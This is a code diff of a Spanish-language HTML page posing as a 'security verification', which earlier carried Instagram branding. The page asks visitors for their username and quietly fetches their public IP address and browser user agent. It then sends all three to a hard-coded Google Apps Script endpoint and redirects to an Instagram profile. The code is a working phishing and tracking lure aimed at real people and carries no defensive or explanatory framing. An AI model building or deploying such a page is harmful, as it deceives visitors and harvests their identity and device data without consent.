@@ -3,60 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Seguridad | Instagram</title>
+    <title>Verificación de Seguridad</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 3px; }
-        .logo { font-weight: bold; font-size: 24px; margin-bottom: 20px; color: #262626; }
-        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; }
-        input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; margin-bottom: 15px; font-size: 12px; }
-        button { width: 100%; background-color: #0095f6; border: none; color: white; padding: 7px 0; border-radius: 4px; font-weight: 600; cursor: pointer; }
-        button:hover { background-color: #1877f2; }
+        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 300px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 10px; margin: 20px 0; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="logo">Seguridad de Red</div>
-    <p>Para ver este contenido, por favor confirma tu nombre de usuario o ID de empleado para validar el acceso desde esta dirección IP.</p>
-    
-    <input type="text" id="userInput" placeholder="Nombre de usuario o ID" required>
-    <button onclick="enviarAuditoria()">Validar Acceso</button>
+    <b style="font-size: 18px;">Seguridad de Acceso</b>
+    <p style="font-size: 13px; color: #666;">Confirma tu identidad para acceder al perfil solicitado.</p>
+    <input type="text" id="userInput" placeholder="Tu usuario o nombre" required>
+    <button id="btn" onclick="enviarDatos()">Verificar y Acceder</button>
 </div>
 
 <script>
-    async function enviarAuditoria() {
-        const userValue = document.getElementById('userInput').value;
-        if (!userValue) { alert("Por favor ingresa tu identificación"); return; }
-
-        document.querySelector('button').innerText = "Verificando...";
+    async function enviarDatos() {
+        const user = document.getElementById('userInput').value;
+        if (!user) { alert("Ingresa tu identificación"); return; }
+        
+        const btn = document.getElementById('btn');
+        btn.innerText = "Procesando...";
+        btn.disabled = true;
 
         try {
-            // 1. Capturar IP
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            const ip = data.ip;
+            // Captura de IP forzada antes del envío
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const miIP = ipData.ip;
+            const miUA = navigator.userAgent;
 
-            // 2. Capturar Hardware
-            const ua = navigator.userAgent;
+            // URL de tu Google Script
+            const scriptURL = "https://script.google.com/macros/s/AKfycbzKmco6ixGg3HijjMVG8rrusr53L3ybLvW0i392T-ITHXSPXhjNqEN__9uHHrAO55MO/exec";
+            
+            // Construcción de la URL de envío con parámetros corregidos
+            const urlFinal = `${scriptURL}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(miIP)}&ua=${encodeURIComponent(miUA)}`;
 
-            // 3. Tu URL de Google Apps Script
-            const googleUrl = "https://script.google.com/macros/s/AKfycbzKmco6ixGg3HijjMVG8rrusr53L3ybLvW0i392T-ITHXSPXhjNqEN__9uHHrAO55MO/exec";
+            // Redirección final
+            window.location.href = urlFinal;
 
-            // 4. Envío de datos y Redirección
-            const finalUrl = `${googleUrl}?u=${encodeURIComponent(userValue)}&ip=${ip}&ua=${encodeURIComponent(ua)}`;
-            window.location.href = finalUrl;
-
-        } catch (error) {
-            // Si falla la red, redirigir igual al destino final
+        } catch (e) {
+            // Si falla la captura de IP, redirigir directo al Instagram moza
             window.location.href = "https://www.instagram.com/jon_laptrona_moza?igsh=MWRqeGUwMW94NmFzNg==";
         }
     }
 </script>
-
-</body>
-</html>
-        capturarAuditoria();
-    </script>
 </body>
 </html>
